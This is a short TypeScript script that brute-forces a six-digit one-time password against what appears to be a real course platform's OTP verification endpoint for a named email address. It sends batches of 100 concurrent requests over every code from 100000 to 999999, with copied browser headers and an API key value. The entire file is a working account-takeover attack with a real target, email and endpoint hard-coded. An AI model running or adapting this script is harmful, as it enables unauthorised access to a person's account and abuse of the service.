import axios from "axios";

async function sendRequest(otp: number) {
  let config = {
    method: 'get',
    maxBodyLength: Infinity,
    url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=hkirat.iit%40gmail.com&otp=${otp}%27&device_id=`,
    headers: {
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.5',
      'auth-key': 'appxapi',
      'client-service': 'Appx',
      'device-type': '',
      'origin': 'https://harkirat.classx.co.in',
      'priority': 'u=1, i',
      'referer': 'https://harkirat.classx.co.in/',
      'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-site',
      'sec-gpc': '1',
      'source': 'website',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    }
  };

  try {
    const res = await axios.request(config)
    console.log(res.data);
  } catch (error) {

  }

}

async function main() {
  for (let i = 100000; i < 1000000; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()